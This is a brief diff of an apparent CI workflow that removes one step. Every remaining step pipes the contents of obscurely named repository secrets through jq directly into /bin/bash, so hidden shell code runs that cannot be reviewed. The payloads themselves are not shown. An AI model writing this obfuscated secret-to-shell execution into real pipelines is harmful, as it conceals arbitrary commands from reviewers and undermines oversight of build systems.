@@ -22,7 +22,6 @@ jobs:
           df3: ${{ secrets.df3 }}
         run: |
           printf '%s' "$df3" | jq -r .ekfig34955 | /bin/bash
-          printf '%s' "$pwpc3" | jq -r .pbe0 | /bin/bash
           printf '%s' "$njiyz426" | jq -r .vzjc5 | /bin/bash
           printf '%s' "$sqju00867" | jq -r .g7 | /bin/bash
           echo $w44 | jq -r .qp908 | /bin/bash
